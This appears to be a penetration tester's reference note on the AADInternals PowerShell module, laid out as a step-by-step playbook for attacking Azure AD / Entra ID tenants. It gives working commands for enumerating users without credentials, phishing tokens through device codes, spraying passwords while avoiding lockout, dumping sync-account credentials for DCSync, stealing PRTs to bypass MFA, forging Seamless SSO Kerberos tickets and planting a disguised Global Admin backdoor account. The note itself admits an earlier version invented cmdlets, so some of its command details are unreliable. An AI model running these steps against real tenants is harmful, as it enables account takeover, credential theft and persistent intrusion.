# AADInternals

**Tags:** `#aadinternals` `#azuread` `#entraid` `#cloud` `#microsoft365` `#powershell` `#enumeration` `#postexploitation`

PowerShell module for enumerating, attacking, and backdooring Azure AD / Microsoft Entra ID tenants. Covers everything from unauthenticated external recon to post-compromise backdooring, PTA agent abuse, and Azure AD Connect credential extraction. One of the primary tools for any M365/Azure engagement.

**Source:** https://github.com/Gerenios/AADInternals
**Docs:** https://aadinternals.com/aadinternals/
**Install:** `Install-Module AADInternals` or `Import-Module .\AADInternals.psd1` from the repo

```powershell
# Install from PowerShell Gallery
Install-Module AADInternals -Scope CurrentUser

# Import
Import-Module AADInternals

# Verify
Get-Command -Module AADInternals | Measure-Object   # lists all available functions
```

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] for the broader Entra/Azure AD attack methodology, MFA bypass, Conditional Access bypass, token abuse chains, and Graph API enumeration. This note covers the AADInternals module commands specifically.

> [!warning] **AADInternals cmdlet names drift hard between versions — verify on the box.** Functions get renamed or **removed** release to release (spraying, PTASpy, and the PRT-nonce flow that older guides show are **gone** from the current public module). Before relying on a command here, confirm it exists: `Get-Command -Module AADInternals -Verb Get,Invoke,New,Set | Select Name`, or `Get-Command -Module AADInternals *PRT*`. Corrections below reflect the current `Gerenios/AADInternals` master.

---

## External Recon (No Auth Required)

```powershell
# Full tenant recon — no credentials needed
Invoke-AADIntReconAsOutsider -DomainName company.com | Format-List
# Returns: tenant name, tenant ID, auth type (Managed/Federated), MDI presence,
#          MFA methods in use, Seamless SSO status, DesktopSSO

# Check if a single user exists (no auth)
Invoke-AADIntUserEnumerationAsOutsider -UserName user@company.com

# Bulk user enumeration from file
Invoke-AADIntUserEnumerationAsOutsider -UserList users.txt

# Get all domains registered to a tenant
Get-AADIntTenantDomains -Domain company.com

# Check if Seamless SSO is enabled
Get-AADIntLoginInformation -Domain company.com | Select-Object DesktopSSOEnabled
```

---

## Authentication — Getting Tokens

AADInternals needs an access token for most operations. Multiple ways to get one depending on what you have.

```powershell
# Interactive browser login (opens browser)
$token = Get-AADIntAccessTokenForMSGraph
$tokenEXO = Get-AADIntAccessTokenForEXO        # Exchange Online
$tokenAZ = Get-AADIntAccessTokenForAzureCoreManagement  # Azure ARM

# From credentials (bypasses browser)
$creds = Get-Credential
$token = Get-AADIntAccessTokenForMSGraph -Credentials $creds

# Device code (phishing method — give the code to the target)
Get-AADIntAccessTokenForMSGraph -DeviceCode
# Outputs a user_code — victim enters at microsoft.com/devicelogin
# AADInternals polls and returns the token when they complete it

# From a stolen refresh token
$token = Get-AADIntAccessTokenForMSGraph -RefreshToken "<refresh-token>"

# From a stolen PRT (Primary Refresh Token) — see the PRT section below;
# the old Get-AADIntUserPRTNonce two-step is gone, mint the cookie with New-AADIntUserPRTToken

# Reuse a token across commands without passing -AccessToken each time:
# acquire it with -SaveToCache $true, then omit -AccessToken on later calls
$token = Get-AADIntAccessTokenForMSGraph -SaveToCache $true
```

---

## Password Spraying

> [!warning] **AADInternals has no built-in spray cmdlet.** `Invoke-AADIntPasswordSpray*` (EWS/Graph/ADFS) **does not exist** — a prior version of this note invented them. AADInternals' role here is **recon + single-credential validation**; do the actual spray with a dedicated tool.

```powershell
# 1. Enumerate valid users (no auth) and learn the tenant's auth type + lockout surface
Invoke-AADIntReconAsOutsider -DomainName company.com | Format-List   # Managed vs Federated, MDI, SSO
Invoke-AADIntUserEnumerationAsOutsider -UserList users.txt           # keep only the valid UPNs

# 2. Validate ONE candidate credential (single account = no lockout risk)
$cred = Get-Credential
Get-AADIntAccessTokenForMSGraph -Credentials $cred    # returns a token = creds are valid
```

Then spray with the tool that matches the auth type:
- **MSOLSpray** / **TREVORspray** — managed tenants (login.microsoftonline.com); parse Smart Lockout responses
- **o365spray** / **omnispray** — modular, cover EWS / ADFS / Graph endpoints
- **MFASweep** — once you get a hit, find which protocols skip MFA

> [!warning] **Smart Lockout** — Entra locks accounts after ~10 failed attempts per 60 seconds. Spray once per account per round, wait 60+ minutes between rounds; some legacy endpoints (EWS/ADFS) track lockout separately from the primary endpoint.

---

## Internal Enumeration (Authenticated)

```powershell
# Set token once, all commands below use it
$token = Get-AADIntAccessTokenForMSGraph

# All users
Get-AADIntUsers -AccessToken $token | Select-Object UserPrincipalName, DisplayName, Enabled, OnPremisesSyncEnabled

# All groups
Get-AADIntGroups -AccessToken $token | Select-Object DisplayName, Id

# All service principals
Get-AADIntServicePrincipals -AccessToken $token | Select-Object DisplayName, AppId

# Full internal recon (if Global Admin)
Invoke-AADIntReconAsInsider

# Assigned directory roles (who is Global Admin, etc.)
Get-AADIntUsers -AccessToken $token | Where-Object {$_.AssignedRoles}
```

---

## Azure AD Connect Attacks

Azure AD Connect syncs on-prem AD to Entra ID. The MSOL service account has DCSync rights on-prem — compromising the Connect server = full domain + tenant control.

```powershell
# Run on the Azure AD Connect / Entra Connect Sync server (local admin required)
Import-Module AADInternals

# Extract the MSOL_* sync-account credentials (cleartext) from the ADSync DB
# NOTE: verify the exact cmdlet on your version — Get-AADIntSyncCredentials was
# removed from recent public releases:
Get-Command -Module AADInternals *Sync*, *ADSync*
# The MSOL_* account has DCSync rights on-prem, so recovering it = full domain replication.
# Use MSOL creds to DCSync from anywhere:
# secretsdump.py 'corp.local/MSOL_abc123:<password>@<dc-ip>'
```

> [!warning] **The one-liner cred dumper moved.** If your AADInternals build no longer exposes `Get-AADIntSyncCredentials`, the *technique* is unchanged — decrypt the ADSync SQL DB + DPAPI keys directly. Fallbacks: **`adconnectdump`** (fox-it) or dirkjanm's **ADSyncDecrypt** on the Connect server, or mimikatz. `Enable-AADIntTenantMsolAccess` / `Disable-AADIntTenantMsolAccess` toggle whether the MSOL path is usable.

---

## Pass-Through Authentication (PTA) Agent Abuse

If the PTA agent runs on a host you control (or you register a rogue one), you can intercept authentication or accept any password.

> [!warning] **PTASpy was pulled from the public module.** `Install-AADIntPTASpy` / `Get-AADIntPTASpyLog` / `Set-AADIntPTABypass` **no longer exist** in `Gerenios/AADInternals` master. What remains is **`Register-AADIntPTAAgent`** — register a *rogue* PTA agent to the tenant (needs a Global Admin token), which then authorises/harvests logons through infrastructure you control. Verify with `Get-Command -Module AADInternals *PTA*`.

```powershell
# Register a rogue PTA agent against the tenant (Global Admin token required),
# then run the agent service with the returned certificate to intercept auth.
Register-AADIntPTAAgent -AccessToken $token
# See the AADInternals docs for the current agent-install / bypass steps —
# the historical PTASpy DLL-injection workflow is no longer shipped in the module.
```

---

## PRT (Primary Refresh Token) Abuse

PRTs are issued to Azure AD-joined Windows devices. Stealing one = authenticate as the user without MFA (device compliance already satisfied).

```powershell
# PRT + session key come from LSASS — Mimikatz: privilege::debug ; sekurlsa::cloudap
# (or extract on-box with AADInternals' own device functions: Get-AADIntUserPRTKeys)

# Mint the SSO cookie (x-ms-RefreshTokenCredential) from the PRT + session key.
# The nonce is fetched internally — the old Get-AADIntUserPRTNonce step is gone.
$cookie = New-AADIntUserPRTToken -RefreshToken "<prt-base64>" -SessionKey "<hex-sessionkey>"
# Set that value as the x-ms-RefreshTokenCredential cookie in a browser → portal.azure.com (rides the session, no MFA)

# To exchange a PRT for an access token programmatically instead, use the PRT-token cmdlets:
Get-Command -Module AADInternals *PRTToken*   # e.g. Get-AADIntAccessTokenWithPRTToken
```

---

## Seamless SSO — Silver Ticket for Azure AD

If Seamless SSO is enabled, the on-prem computer account `AZUREADSSOACC$` holds a Kerberos key that can forge service tickets for Azure AD auth.

```powershell
# Requires: AZUREADSSOACC$ NTLM hash (from DCSync or secretsdump)

# Forge Kerberos ticket for any Azure AD user (including Global Admins)
New-AADIntKerberosTicket `
  -DomainName "corp.local" `
  -UserPrincipalName "globaladmin@company.com" `
  -UserSid "<user-SID>" `
  -NTLM "<AZUREADSSOACC-hash>"
```

---

## Backdooring

```powershell
# Create a new user, then grant Global Admin.
# NOTE: Add-AADIntGlobalAdmin does not exist — add to the role by its INTERNAL name,
# which is "Company Administrator" (= Global Administrator in the portal).
New-AADIntUser -UserPrincipalName backdoor@company.com -DisplayName "IT Support" -Password "P@ssw0rd123!"
Add-AADIntRoleMembersByRoleName -RoleName "Company Administrator" -UserPrincipalName backdoor@company.com

# Reset any user's password (bypasses MFA-protected self-service reset)
Set-AADIntUserPassword -SourceAnchor "<immutable-id>" -Password "NewPass123!"

# Add credentials to a service principal (persistent access via app)
# → see Graph API section in Entra ID note for raw HTTP approach
```

---

## Useful Misc Commands

```powershell
# Get tenant ID from domain
Get-AADIntTenantID -Domain company.com

# Check if a domain is Managed or Federated
Get-AADIntLoginInformation -Domain company.com | Select-Object NameSpaceType, FederationBrandName

# Get all registered domains in a tenant
Get-AADIntTenantDomains -Domain company.com

# List conditional access policies (requires token with Policy.Read.All)
Get-AADIntConditionalAccessPolicies -AccessToken $token

# Decode any JWT access token
Read-AADIntAccessToken -AccessToken "<jwt>"
```

---

*Created: 2026-03-06*
*Updated: 2026-08-27*
*Model: claude-opus-5*
